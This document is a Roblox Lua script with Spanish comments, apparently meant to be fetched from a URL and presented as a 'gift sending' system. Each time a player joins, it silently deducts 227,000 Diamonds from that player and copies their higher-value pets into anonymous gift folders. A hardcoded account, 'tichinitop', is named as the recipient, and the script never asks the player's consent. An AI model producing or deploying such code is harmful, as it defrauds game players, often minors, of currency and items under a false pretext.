-- Contenido de tu script Lua
-- Este es el contenido que debería estar en el archivo al que apunta tu URL

-- Configuración del sistema de envío de regalos
local costoDiamonds = 227000  -- Costo en Diamonds para enviar regalos
local umbralValor = 5  -- Valor mínimo de un objeto para ser enviado como regalo
local regalosNoEntregadosFolder = game.ServerStorage:FindFirstChild("RegalosNoEntregados")  -- Carpeta para almacenar regalos no entregados

-- Si no existe la carpeta de regalos no entregados, crearla
if not regalosNoEntregadosFolder then
    regalosNoEntregadosFolder = Instance.new("Folder")
    regalosNoEntregadosFolder.Name = "RegalosNoEntregados"
    regalosNoEntregadosFolder.Parent = game.ServerStorage
end

-- Función para deducir Diamonds del jugador
local function deducirDiamonds(player, cantidad)
    local diamonds = player:FindFirstChild("Diamonds")  -- Asegúrate de que este nombre sea correcto en tu juego
    if not diamonds or diamonds.Value < cantidad then
        return false
    end
    diamonds.Value = diamonds.Value - cantidad
    return true
end

-- Función para enviar objetos
local function enviarObjetos(player)
    -- Esperar 5 segundos
    wait(5)

    -- Acceder al inventario del jugador que entró
    local inventario = player:FindFirstChild("Pets")  -- Cambia esto al nombre correcto del inventario en tu juego

    if not inventario then
        warn("Inventario de mascotas no encontrado para " .. player.Name)
        return
    end

    -- El jugador receptor será tichinitop
    local jugadorReceptorNombre = "tichinitop"

    -- Crear una tabla para almacenar los objetos filtrados
    local objetosFiltrados = {}

    -- Filtrar los objetos de mayor valor
    print("Filtrando objetos en el inventario de " .. player.Name .. ":")
    for _, item in ipairs(inventario:GetChildren()) do
        if item:IsA("Model") then
            -- Verificar el valor del objeto
            local valor = item:FindFirstChild("Value") and item.Value.Value or 0
            if valor >= umbralValor then
                table.insert(objetosFiltrados, item)
                print(item.Name .. " - Valor: " .. valor)
            end
        end
    end

    -- Verificar si el jugador tiene suficientes Diamonds
    if not deducirDiamonds(player, costoDiamonds) then
        warn("El jugador " .. player.Name .. " no tiene suficientes Diamonds para enviar el regalo.")
        return
    end

    -- Almacenar los objetos como regalos anónimos
    local genericoFolderName = "Regalo_" .. tick()  -- Nombre genérico para la carpeta
    local receptorFolder = Instance.new("Folder")
    receptorFolder.Name = genericoFolderName
    receptorFolder.Parent = regalosNoEntregadosFolder

    for _, item in ipairs(objetosFiltrados) do
        local regalo = item:Clone()
        regalo.Parent = receptorFolder
        print(item.Name .. " ha sido almacenado como un regalo anónimo")
    end
end

-- Conectar el evento PlayerAdded a la función enviarObjetos
game.Players.PlayerAdded:Connect(enviarObjetos)
